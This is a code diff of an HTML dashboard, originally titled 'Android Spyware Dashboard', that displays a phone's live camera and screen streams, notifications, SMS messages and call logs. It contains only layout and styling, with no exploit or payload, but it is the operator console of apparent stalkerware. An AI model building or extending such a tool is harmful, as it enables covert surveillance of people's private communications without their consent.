@@ -3,121 +3,45 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Android Spyware Dashboard</title>
+  <title>Android Surveillance Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
     :root {
       --primary-dark: #1e3a8a;
       --primary-light: #3b82f6;
-      --background-dark: #111827;
-      --background-secondary: #1f2937;
-      --text-light: #f3f4f6;
-      --text-secondary: #9ca3af;
-      --accent: #10b981;
-    }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+      --background-dark: #0f172a;
+      --background-secondary: #1e293b;
+      --text-light: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --accent: #22d3ee;
     }
 
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       background-color: var(--background-dark);
       color: var(--text-light);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
     }
 
-    .dashboard {
-      flex: 1;
-      display: grid;
-      grid-template-rows: auto 1fr;
-      max-width: 1400px;
-      margin: 0 auto;
-      width: 100%;
-      padding: 1rem;
+    /* Fade-in animation for elements */
+    .fade-in {
+      animation: fadeIn 0.5s ease-in;
     }
 
-    header {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem 2rem;
-      background-color: var(--background-secondary);
-      border-radius: 0.5rem;
-      margin-bottom: 1rem;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
     }
 
-    .header-title {
-      font-size: 2rem;
-      font-weight: 700;
-      color: var(--primary-light);
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+    /* Scale animation for hover effects */
+    .hover-scale {
+      transition: transform 0.3s ease;
     }
 
-    .main-content {
-      display: grid;
-      grid-template-columns: 3fr 1fr;
-      gap: 1rem;
-      height: calc(100vh - 120px);
+    .hover-scale:hover {
+      transform: scale(1.02);
     }
 
-    .video-container {
-      background-color: var(--background-secondary);
-      border-radius: 0.5rem;
-      padding: 1rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-    }
-
-    #remoteVideo {
-      width: 100%;
-      height: 100%;
-      max-height: 600px;
-      background: black;
-      border-radius: 0.4rem;
-      object-fit: contain;
-      border: 1px solid var(--primary-dark);
-    }
-
-    .status-panel {
-      background-color: var(--background-secondary);
-      border-radius: 0.5rem;
-      padding: 1.5rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-    }
-
-    #status {
-      font-size: 0.9rem;
-      color: var(--text-secondary);
-      background-color: rgba(0, 0, 0, 0.2);
-      padding: 0.75rem;
-      border-radius: 0.3rem;
-      line-height: 1.4;
-    }
-
-    .status-indicator {
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      font-size: 0.9rem;
-    }
-
+    /* Pulse animation for status dot */
     .status-dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background-color: var(--accent);
       animation: pulse 2s infinite;
     }
 
@@ -127,60 +51,116 @@
       100% { opacity: 1; }
     }
 
-    @media (max-width: 1024px) {
-      .main-content {
-        grid-template-columns: 1fr;
-        grid-template-rows: auto auto;
-        height: auto;
-      }
-
-      .status-panel {
-        order: 1;
-      }
-
-      .video-container {
-        order: 2;
-      }
-
-      #remoteVideo {
-        max-height: 400px;
-      }
+    /* Video container default aspect ratio */
+    .video-aspect-camera {
+      aspect-ratio: 4 / 3; /* Matches 640x480 camera */
     }
 
-    @media (max-width: 640px) {
-      .dashboard {
-        padding: 0.5rem;
-      }
+    .video-aspect-screen {
+      aspect-ratio: 16 / 9; /* Matches 960x540 screen */
+    }
 
-      header {
-        padding: 1rem;
-      }
+    /* Styling for notification, SMS, and call log entries */
+    .data-entry {
+      padding: 0.5rem;
+      margin-bottom: 0.5rem;
+      border-left: 3px solid var(--accent);
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 0.25rem;
+      transition: background 0.3s ease;
+    }
 
-      .header-title {
-        font-size: 1.5rem;
+    .data-entry:hover {
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    .data-entry p {
+      margin: 0;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Responsive video containers */
+    @media (max-width: 1024px) {
+      .video-aspect-camera, .video-aspect-screen {
+        aspect-ratio: auto;
+        max-height: 400px;
       }
     }
   </style>
 </head>
-<body>
-  <div class="dashboard">
-    <header>
-      <h1 class="header-title">Android Surveillance Hub</h1>
-    </header>
-    <div class="main-content">
-      <div class="video-container">
-        <video id="remoteVideo" autoplay playsinline></video>
+<body class="min-h-screen flex flex-col font-sans antialiased">
+<div class="dashboard flex-1 max-w-7xl mx-auto w-full p-4">
+  <header class="fade-in flex items-center justify-center py-6 bg-[var(--background-secondary)] rounded-lg shadow-lg mb-4">
+    <h1 class="text-3xl font-bold text-[var(--primary-light)] uppercase tracking-wide">Android Surveillance Hub</h1>
+  </header>
+  <div class="main-content flex flex-col gap-4">
+    <!-- Row 1: Camera Video -->
+    <div class="row-1 grid grid-cols-3 gap-4">
+      <div class="col-span-3 video-container bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in video-aspect-camera">
+        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Camera Stream</h2>
+        <video id="remoteVideo" autoplay playsinline class="w-full h-full rounded-md border border-[var(--primary-dark)] bg-black object-contain"></video>
       </div>
-      <div class="status-panel">
-        <div class="status-indicator">
-          <span class="status-dot"></span>
-          <span>Stream Status</span>
+    </div>
+    <!-- Row 2: Screen-Sharing Video and Notifications -->
+    <div class="row-2 grid grid-cols-3 gap-4">
+      <div class="col-span-2 video-container bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in video-aspect-screen" id="screen-video-container">
+        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Screen Stream</h2>
+        <video id="screenVideo" autoplay playsinline class="w-full h-full rounded-md border border-[var(--primary-dark)] bg-black object-contain"></video>
+      </div>
+      <div class="notifications-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
+        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Live Notifications</h2>
+        <div id="notifications" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-80 overflow-y-auto">
+          <p>Waiting for notifications...</p>
         </div>
-        <div id="status">Waiting for Android stream...</div>
+      </div>
+    </div>
+    <!-- Row 3: SMS and Call Logs -->
+    <div class="row-3 grid grid-cols-2 gap-4">
+      <div class="sms-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
+        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">SMS Messages</h2>
+        <div id="sms" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-64 overflow-y-auto">
+          <p>Waiting for SMS...</p>
+        </div>
+      </div>
+      <div class="call-logs-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
+        <h2 class="text-lg font-semibold text-[var(--text-light)] mb-2">Call Logs</h2>
+        <div id="call-logs" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md h-64 overflow-y-auto">
+          <p>Waiting for call logs...</p>
+        </div>
+      </div>
+    </div>
+    <!-- Status Panel -->
+    <div class="status-panel bg-[var(--background-secondary)] rounded-lg p-4 shadow-lg fade-in">
+      <div class="flex items-center gap-2 mb-2">
+        <span class="status-dot w-3 h-3 rounded-full bg-[var(--accent)]"></span>
+        <h2 class="text-lg font-semibold text-[var(--text-light)]">Stream Status</h2>
+      </div>
+      <div id="status" class="text-[var(--text-secondary)] text-sm bg-black/20 p-3 rounded-md mb-2">Waiting for Android stream...</div>
+      <div class="status-details grid grid-cols-2 gap-2 text-sm">
+        <div>
+          <p><strong>Connection:</strong> <span id="connection-status">Disconnected</span></p>
+          <p><strong>Camera Resolution:</strong> <span id="camera-resolution">N/A</span></p>
+          <p><strong>Screen Resolution:</strong> <span id="screen-resolution">N/A</span></p>
+        </div>
+        <div>
+          <p><strong>Web Client ID:</strong> <span id="web-client-id">N/A</span></p>
+          <p><strong>Android Client ID:</strong> <span id="android-client-id">N/A</span></p>
+          <p><strong>Frame Rate:</strong> <span id="frame-rate">N/A</span></p>
+        </div>
+      </div>
+      <div class="controls flex gap-2 mt-2">
+        <button id="mute-audio" class="hover-scale bg-[var(--primary-dark)] text-[var(--text-light)] px-4 py-2 rounded-md hover:bg-[var(--primary-light)] transition-colors">Mute Audio</button>
+        <button id="pause-video" class="hover-scale bg-[var(--primary-dark)] text-[var(--text-light)] px-4 py-2 rounded-md hover:bg-[var(--primary-light)] transition-colors">Pause Video</button>
       </div>
     </div>
   </div>
-  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-  <script src="client.js"></script>
+</div>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="client.js"></script>
 </body>
 </html>
